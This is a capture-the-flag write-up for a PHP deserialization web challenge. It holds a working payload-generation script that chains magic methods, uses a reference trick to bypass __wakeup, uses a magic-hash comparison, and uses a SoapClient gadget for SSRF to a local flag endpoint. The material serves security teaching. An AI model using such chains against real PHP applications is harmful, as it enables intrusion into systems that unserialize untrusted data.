#DeserPlus

**Author:** tel

**Difficulty:** Medium

**Category:** Web

## Title description

Have you learned the common bypassing techniques of PHP deserialization?

## Question analysis

**Exposed port: `80`**

1. flag.php can write the flag to flag.txt, and then you can access `http://xxx/flag.txt` to get the flag, but SSRF is required. Use the `__call` function of the PHP native class `SoapClient` to implement SSRF

2. `__wakeup` in `class A` will set `a` to `hacker?`, which requires common **reference bypass** in PHP deserialization, so use `B::__destruct $this->b = $this->k;` to implement reassignment

```php
<?php

     highlight_file(__FILE__);

     // something in flag.php

     class A
     {
         public $a;
         public $b;

         public function __wakeup()
         {
             $this->a = "hacker?";
         }

         public function __invoke()
         {
             if (isset($this->a) && $this->a == md5($this->a)) {
                 $this->b->uwant();
             }
         }
     }

     class B
     {
         public $a;
         public $b;
         public $k;

         function __destruct()
         {
             $this->b = $this->k;
             die($this->a);
         }
     }

     class C
     {
         public $a;
         public $c;

         public function __toString()
         {
             $cc = $this->c;
             return $cc();
         }
         public function uwant()
         {
             if ($this->a == "phpinfo") {
                 phpinfo();
             } else {
                 $this->a->unexist_function();
             }
         }
     }

     $b = new B();
     $a = new A();
     $b->b = &$a->a;
     $b->k = "0e215962017";
     $c1 = new C();
     $c2 = new C();
     $c1->c = $a;
     $b->a = $c1;
     $c2->a = new SoapClient(null,array('location'=>'http://127.0.0.1/flag.php', 'uri'=>'http://127.0.0.1/flag.php' ));
     // $c2->a = "phpinfo";
     $a->b = $c2;
     echo serialize($b);
```